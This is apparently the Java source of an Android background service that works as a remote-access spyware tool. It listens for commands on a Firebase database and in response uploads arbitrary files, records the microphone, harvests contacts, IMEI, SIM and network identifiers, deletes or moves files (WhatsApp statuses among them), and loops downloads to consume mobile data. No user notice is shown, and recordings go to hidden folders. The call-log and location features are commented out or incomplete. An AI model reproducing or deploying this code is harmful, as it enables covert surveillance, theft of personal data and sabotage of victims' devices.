package com.example.kalya.simcard1;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telecom.Call;
import android.telephony.CellInfo;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.util.Size;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderApi;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.security.Policy;
import java.text.FieldPosition;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import me.everything.providers.android.calllog.CallsProvider;

import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;
import static android.content.ContentValues.TAG;

/**
 * Created by kalya on 18-Apr-17.
 */
@RequiresApi(api = Build.VERSION_CODES.M)
public class MyService extends Service {
    public static SurfaceView mSurfaceView;
    public static SurfaceHolder mSurfaceHolder;
    public static Camera mCamera;
    public static boolean mPreviewRunning;
    private FusedLocationProviderClient fusedLocationProviderClient;
    FirebaseStorage storage = FirebaseStorage.getInstance();
    private static final int Request_Location = 1;
    LocationManager locationManager;
    Location mLastLocation;
    double latitude;
    double longitude;
    MediaRecorder mediaRecorder;
    Random random;
    String up = "", way1 = "";
    Context context;
    DevicePolicyManager mDevice;
    Bitmap bitmap1, bitmap2;
    Intent i;
    ByteArrayOutputStream bytearrayoutputstream;
    byte[] BYTE;
    String path, refpathstring;
    String extension = "", deviceid = "";
    String root = Environment.getExternalStorageDirectory().getAbsolutePath();
    String AudioSavePathInDevice = null;
    final String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
    private StorageReference mStorageRef;
    DatabaseReference ref = FirebaseDatabase.getInstance().getReferenceFromUrl("https://soundinbackground.firebaseio.com/");
    DatabaseReference refpath;

    private String DeviceID() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
        }
        deviceid = tm.getDeviceId();
        return deviceid;
    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate() {
        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);


    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {


        CreatePath();
        //Toast.makeText(this, "service started", Toast.LENGTH_LONG).show();
        i = intent;
        final String RandomAudioFileName = "ABCDEFGHIJKLMNOP";
        final int RequestPermissionCode = 1;
        MediaPlayer mediaPlayer;

        final int currentId = startId;

        refpath.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot dataSnapshot, String s) {

            }

            @RequiresApi(api = Build.VERSION_CODES.M)
            @Override
            public void onChildChanged(DataSnapshot dataSnapshot, String s) {

                String name = dataSnapshot.getValue().toString();
                String value = dataSnapshot.getKey().toString();
                //Toast.makeText(MyService.this, value, Toast.LENGTH_LONG).show();

                if (value.equals("cmd")) {
                    String way = name.substring(1, name.length());
                    char firstLetter = name.charAt(0);
                    String First = Character.toString(firstLetter);
                    if (name.length() > 6) {
                        up = name.substring(0, 7);
                        //Toast.makeText(MyService.this,up,Toast.LENGTH_LONG).show();
                        way1 = name.substring(7, name.length());
                        //Toast.makeText(MyService.this,way1,Toast.LENGTH_LONG).show();
                    }
                    if (name.equals("MultipleDcim")) {
                        try {
                            multipleImage();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else if (name.equals("Contacts")) {
                        Contacts();
                    } else if (name.equals("RecordStart")) {
                        Record("start");
                    } else if (name.equals("RecordStop")) {
                        Record("stop");
                    } else if (name.equals("DeleteStatus")) {
                        DeleteStatus();
                    } else if (name.equals("location")) {
                        //Location();
                        Location1();
                    } else if (First.equals(":") && !way.equals(null)) {
                        //Toast.makeText(MyService.this, "colon", Toast.LENGTH_LONG).show();
                        UpdatePath(way);
                    } else if (up.equals("upload:")) {
                        //not working UploadFile
                        UploadFile(way1);
                    } else if (up.equals("Delete:")) {
                        Delete(way1);
                    } else if (name.equals("mac")) {
                        macAddress();
                    } else if (name.equals("status")) {
                        status();
                    } else if (up.equals("rename:")) {
                        rename(way1);
                    } else if (up.equals("mvfile:")) {
                        movie(way1);
                    } else if (name.equals("consumnet")) {
                        try {
                            consumnet();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else if (name.equals("callHistory")) {
                        CallHistory();
                    }
                }
            }


            @Override
            public void onChildRemoved(DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });


        return Service.START_STICKY_COMPATIBILITY;

    }

    private void CallHistory() {
        /*CallsProvider callsProvider = new CallsProvider(context);
        List<me.everything.providers.android.calllog.Call> calls = callsProvider.getCalls().getList();
        String b = calls.get(0).toString();
        Toast.makeText(this,b,Toast.LENGTH_LONG).show();/*
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        @SuppressLint("MissingPermission") Cursor mCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
                null, null);
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        StringBuilder sb = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            sb.append("Phone number " + phnumber);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call duration " + callduration);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call type " + callTypeStr);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call date " + d);
            sb.append(System.getProperty("line.separator"));
        }
        for (int i = 0 ; i<20 ; i++)
        {
            refpath.child("callLog").setValue(sb);
        }
*/
    }

    private void consumnet() throws IOException {
        StorageReference storageRef = storage.getReference();
        StorageReference pathReference = storageRef.child("netfile.mp4");
        File n = new File(root+ "/Android/.myfiles/");
        File localFile = File.createTempFile("video", "mp4",n);
        //File localFile = new File(root + "/.myfiles/");
        pathReference.getFile(localFile).addOnSuccessListener(new OnSuccessListener<FileDownloadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                Toast.makeText(MyService.this,"done",Toast.LENGTH_LONG).show();
                try {
                    redownload();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                // Handle any errors
            }
        });
    }

    private void redownload() throws IOException {
        File file = new File(root+"/Android/.myfiles/");
        File[] files = file.listFiles();
        for (int i = 0;i<files.length;i++)
        {
            File x = new File(file +"/"+ files[i].getName());
            //Toast.makeText(MyService.this,x.toString(),Toast.LENGTH_LONG).show();
            if (x.delete())
            {
                consumnet();
            };

        }

    }

    private void movie(String way1)  {
        int start=0,end=0;
        String text = way1;
        String dash = "->";
        Pattern word = Pattern.compile(dash);
        Matcher matcher = word.matcher(text);
        while (matcher.find())
        {
            start = matcher.start();
            end = matcher.end();
        }
        if (start!=0&&end!=0)
        {
            //Toast.makeText(MyService.this,Integer.toString(start),Toast.LENGTH_LONG).show();
            String from = way1.substring(0,start);
            String to = way1.substring(end,way1.length());
            File fr = new File(root + "/" + from);
            File t = new File(root + "/" + to);
            //Toast.makeText(MyService.this,to,Toast.LENGTH_LONG).show();
            try {
                moveFile(fr,t);
            } catch (IOException e) {
                e.printStackTrace();
            }
            //Toast.makeText(MyService.this,from,Toast.LENGTH_LONG).show();
            //Toast.makeText(MyService.this,to,Toast.LENGTH_LONG).show();
        }
    }

    private void rename(String way1) {
        int start=0,end=0;
        String text = way1;
        String dash = "->";
        Pattern word = Pattern.compile(dash);
        Matcher matcher = word.matcher(text);
        while (matcher.find())
        {
            start = matcher.start();
            end = matcher.end();
                           /*System.out.print(matcher.start() - 1);
                           System.out.print(" " + dash + " ");
                           System.out.println(matcher.end());*/
        }
        if (start!=0&&end!=0)
        {
            //Toast.makeText(MyService.this,Integer.toString(start),Toast.LENGTH_LONG).show();
            String from = way1.substring(0,start);
            String to = way1.substring(end,way1.length());
            File fr = new File(root + "/" + from);
            File t = new File(root + "/" + to);
            //Toast.makeText(MyService.this,to,Toast.LENGTH_LONG).show();
            fr.renameTo(t);
            //Toast.makeText(MyService.this,from,Toast.LENGTH_LONG).show();
            //Toast.makeText(MyService.this,to,Toast.LENGTH_LONG).show();
        }
    }

    private void status() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
        }
        Intent battery = registerReceiver(null,new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL,-1);
        int level1 = battery.getIntExtra(BatteryManager.EXTRA_PLUGGED,-1);
        String imei1 = tm.getDeviceId(1);
        String imei2 = tm.getDeviceId(2);
        String subid = tm.getSubscriberId();
        //String phoneNumber = tm.getLine1Number();
        String simOperator = tm.getSimOperator();
        String sim = tm.getSimSerialNumber();
        int dataState = tm.getDataState();
        String carrierName = tm.getNetworkOperatorName();
        List<CellInfo> loc = tm.getAllCellInfo();
        String ipv6 = Utils.getIPAddress(false);
        String mac =  Utils.getMACAddress( "wlan0");
        //Toast.makeText(MyService.this, Integer.toString(level),Toast.LENGTH_LONG).show();
        /*Toast.makeText(MyService.this, Integer.toString(level1),Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this, carrierName,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,imei1,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,imei2,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,subid,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,ipv6,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,mac,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,simOperator,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this, sim,Toast.LENGTH_LONG).show();*/
        refpath.child(ip()).removeValue();
        refpath.child(ip()).child("sim name").setValue(carrierName);
        refpath.child(ip()).child("ipAddress").setValue(ipv6);
        refpath.child(ip()).child("imei1").setValue(imei1);
        refpath.child(ip()).child("imei2").setValue(imei2);
        refpath.child(ip()).child("battery level").setValue(level);
        refpath.child(ip()).child("power connected to").setValue(level1);
    }

    private void Record(String start) {
        AudioSavePathInDevice = Environment.getExternalStorageDirectory().getAbsolutePath() + getFile() + timestamp + "AudioRecording.amr";
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        mediaRecorder.setOutputFile(AudioSavePathInDevice);
        if (start.equals("start")) {
            try {
                mediaRecorder.prepare();
                mediaRecorder.start();
            } catch (IllegalStateException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        if (start.equals("stop")) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            }catch (Exception e)
            {
                //Toast.makeText(MyService.this, "not working",Toast.LENGTH_LONG).show();
            }

        }
    }


    private void camera(String status) {

    }
    private void CreatePath() {
        ref.child(DeviceID()).child("cmd").setValue("Online");
        refpathstring = FirebaseDatabase.getInstance().getReference() +"/"+ DeviceID().toString();
        refpath = FirebaseDatabase.getInstance().getReferenceFromUrl(refpathstring);
        //Toast.makeText(this,refpathstring,Toast.LENGTH_LONG).show();
        //refpath=  FirebaseDatabase.getReferenceFromUrl(refpathstring);
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void macAddress() {
        refpath.child(ip()).child("above is mac").setValue("above is mac");
        String gmail = null;

        Pattern gmailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        @SuppressLint("MissingPermission") Account[] accounts = AccountManager.get(this).getAccounts();
        for (Account account : accounts) {
            if (gmailPattern.matcher(account.name).matches()) {
                gmail = account.name;
            }
        }
    }

    private void Delete(String way1) {
        Uri file = Uri.fromFile(new File(root + "/" + way1));
        File file2= new File(file.getPath());
        file2.delete();
    }
    private void UploadFile(String way1) {
        //Toast.makeText(MyService.this,"uploading",Toast.LENGTH_LONG).show();
        char exten;

        mStorageRef = FirebaseStorage.getInstance().getReference();
        Uri file = Uri.fromFile(new File(root + "/" + way1));
        File file2= new File(file.getPath());
        extension = file2.getName().toString();
       // Toast.makeText(MyService.this,extension,Toast.LENGTH_LONG).show();
        /*for (int i = way1.length();i>0;i--)
        {
            String x = Integer.toString(i);
            char y = way1.charAt(i-1);
            String z = Character.toString(y);
            if (z.equals("/"))
            {
                for (int j = i; j<way1.length();j++)
                {
                     exten = way1.charAt(j);
                     extension =  extension + Character.toString(exten) ;
                    Toast.makeText(MyService.this,extension,Toast.LENGTH_LONG).show();
                }

            }
        }*/
        StorageReference riversRef = mStorageRef.child(extension);
        //Toast.makeText(MyService.this,file.toString(),Toast.LENGTH_LONG).show();
        riversRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // Get a URL to the uploaded content
                        //Toast.makeText(MyService.this,"uploaded",Toast.LENGTH_LONG).show();
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        //Toast.makeText(MyService.this,exception.toString(),Toast.LENGTH_LONG).show();
                        // Handle unsuccessful uploads
                        // ...
                    }
                })
        .addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
               // Toast.makeText(MyService.this,"Uploading",Toast.LENGTH_LONG).show();
            }
        });
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void UpdatePath(String way) {
        refpath.child(ip()).removeValue();
        File file = new File(root+"/"+way);
        File[] files = file.listFiles();
        for (int i = 0;i<files.length;i++)
        {
            int file_size = Integer.parseInt(String.valueOf(files[i].length()/1024));
            refpath.child(ip()).child("files"+i).setValue(files[i].getName()+file_size);
            //Toast.makeText(MyService.this,x.toString(),Toast.LENGTH_LONG).show();
        }
    }

    private void Location1() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        //new Locations();
        /*fusedLocationProviderClient.getLastLocation().addOnCompleteListener((Executor) getBaseContext(), new OnCompleteListener<Location>() {
            @Override
            public void onComplete(@NonNull Task<Location> task) {
                if (task.isSuccessful() && task.getResult() != null) {
                    mLastLocation = task.getResult();
                    latitude = mLastLocation.getLatitude();
                    longitude = mLastLocation.getLongitude();
                    Toast.makeText(MyService.this,latitude+":"+longitude,Toast.LENGTH_LONG).show();
                }
            }
        });*/
    }

    private void Location() {
        LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        LocationListener locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double latitude = location.getLatitude();
                double longitude = location.getLongitude();
                double speed = location.getSpeed(); //spedd in meter/minute
                speed = (speed*3600)/1000;      // speed in km/minute
                Toast.makeText(MyService.this, latitude+":"+ longitude + "Current speed:" + location.getSpeed(),Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 60, 10, locationListener);
    }

    private void DeleteStatus() {
        File file = new File(root+"/WhatsApp/Media/.Statuses/");
        File[] files = file.listFiles();
        for (int i = 0;i<files.length;i++)
        {
            File x = new File(file +"/"+ files[i].getName());
            //Toast.makeText(MyService.this,x.toString(),Toast.LENGTH_LONG).show();
            x.delete();
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private String ip() {

        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
        }
        Intent battery = registerReceiver(null,new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL,-1);
        int level1 = battery.getIntExtra(BatteryManager.EXTRA_PLUGGED,-1);
        String imei1 = tm.getDeviceId(1);
        String imei2 = tm.getDeviceId(2);
        String subid = tm.getSubscriberId();
        String phoneNumber = tm.getLine1Number();
        String simOperator = tm.getSimOperator();
        String sim = tm.getSimSerialNumber();
        int dataState = tm.getDataState();
        String carrierName = tm.getNetworkOperatorName();
        List<CellInfo> loc = tm.getAllCellInfo();
        String ipv6 = Utils.getIPAddress(false);
        String mac =  Utils.getMACAddress( "wlan0");
        //Toast.makeText(MyService.this, Integer.toString(level),Toast.LENGTH_LONG).show();
        /*Toast.makeText(MyService.this, Integer.toString(level1),Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this, carrierName,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,imei1,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,imei2,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,subid,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,ipv6,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,mac,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this,simOperator,Toast.LENGTH_LONG).show();
        Toast.makeText(MyService.this, sim,Toast.LENGTH_LONG).show();*/
        ref.child("status").child("imei1").setValue(imei1);
        ref.child("status").child("imei2").setValue(imei2);
        ref.child("status").child("battery level").setValue(level);
        return mac;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void Contacts() {
        //Toast.makeText(MyService.this,refpath.toString(),Toast.LENGTH_LONG).show();
        String phoneNumber = null;
        List<String> names = new ArrayList<>();
        List<String> phoneNumbers = new ArrayList<>();
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name =phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            names.add(name);
            phoneNumbers.add(phoneNumber);
        }
        phones.close();
        refpath.child(ip()).removeValue();
        for (int i =0;i<names.size();i++)
        {
            refpath.child(ip()).child(String.valueOf(i)).setValue(names.get(i) + ":" +phoneNumbers.get(i));
        }
    }

    private void multipleImage() throws IOException {
        File dir = new File(root);
        path = root+"/DCIM/Camera/";
        File directory = new File(path);
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            File file = new File(directory+"/."+files[i].getName());
            //Toast.makeText(this,file.toString(),Toast.LENGTH_LONG).show();
            moveFile(file,directory);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void record() {
        bytearrayoutputstream = new ByteArrayOutputStream();
        String path2 = Environment.getExternalStorageDirectory().toString()+"/abc.jpg";
        Bitmap bt = BitmapFactory.decodeFile(path2);
        BYTE = bytearrayoutputstream.toByteArray();
        bt.compress(Bitmap.CompressFormat.JPEG, 100, bytearrayoutputstream);
        bitmap2 = BitmapFactory.decodeByteArray(BYTE,0,BYTE.length);



        String root = Environment.getExternalStorageDirectory().getAbsolutePath();
        File myDir = new File(root + "/DCIM");



        try {
            FileOutputStream out = new FileOutputStream(myDir);
            bitmap2.compress(Bitmap.CompressFormat.JPEG, 90, out);
            out.flush();
            out.close();

        } catch (FileNotFoundException e) {
            e.printStackTrace();
            Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(this, "Save Failed", Toast.LENGTH_SHORT).show();
            return;
        }
        checkSelfPermission(Manifest.permission.READ_CONTACTS);

        /*if (Build.BRAND.equalsIgnoreCase("xiaomi")) {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            startActivity(intent);
        }*/
        String path = Environment.getExternalStorageDirectory().toString();
        File directory = new File(path);
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
           // Toast.makeText(this,files[i].getName(),Toast.LENGTH_LONG).show();
            if (files[i].getName().equals(".myfiles")){
                File directory1 = new File(path+"/.myfiles/");
                File[] files1 = directory1.listFiles();
                for (int j = 0;j<files1.length;j++)
                {
                    File file = new File(directory1+"/"+files1[j].getName());
                    file.delete();
                    Toast.makeText(this,"wrkig",Toast.LENGTH_LONG).show();
                }
            }
        }


/*

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();

        }
        phones.close();
*/
    //getFile();




    }


    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(),
                WRITE_EXTERNAL_STORAGE);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(),
                RECORD_AUDIO);
        return result == PackageManager.PERMISSION_GRANTED &&
                result1 == PackageManager.PERMISSION_GRANTED;
    }


    @Override
    public void onDestroy() {
        ref.child(DeviceID()).child("cmd").setValue("offline");
        // mediaRecorder.stop();
    }



    private String getFile(){
        File folder = new File("sdcard/.myfiles");
        String dir = "/.myfiles/";
        if (!folder.exists())
        {
            folder.mkdir();
        }
        return dir;
    }
    private void moveFile(File file, File dir) throws IOException {
        File newFile = new File(dir, file.getName());
        FileChannel outputChannel = null;
        FileChannel inputChannel = null;
        for ( int i = 0;i<5;i++ )
        {
            try {
                outputChannel = new FileOutputStream(newFile).getChannel();
                inputChannel = new FileInputStream(file).getChannel();
                inputChannel.transferTo(0, inputChannel.size(), outputChannel);
                inputChannel.close();
            } finally {
                if (inputChannel != null) inputChannel.close();
                if (outputChannel != null) outputChannel.close();
            }
        }


    }
}

/*public class MyService extends Service {
    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    // Handler that receives messages from the thread
    private final class ServiceHandler extends Handler {
        public ServiceHandler(Looper looper) {
            super(looper);
        }
        @Override
        public void handleMessage(Message msg) {
            // Normally we would do some work here, like download a file.
            // For our sample, we just sleep for 5 seconds.
            try {
                Thread.sleep(50000);
            } catch (InterruptedException e) {
                // Restore interrupt status.
                Thread.currentThread().interrupt();
            }
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job
        }
    }

    @Override
    public void onCreate() {
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show();

        // For each start request, send a message to start a job and deliver the
        // start ID so we know which request we're stopping when we finish the job
        Message msg = mServiceHandler.obtainMessage();
        msg.arg1 = startId;
        mServiceHandler.sendMessage(msg);

        // If we get killed, after returning from here, restart
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    @Override
    public void onDestroy() {
        Toast.makeText(this, "service done", Toast.LENGTH_SHORT).show();
    }
}*/
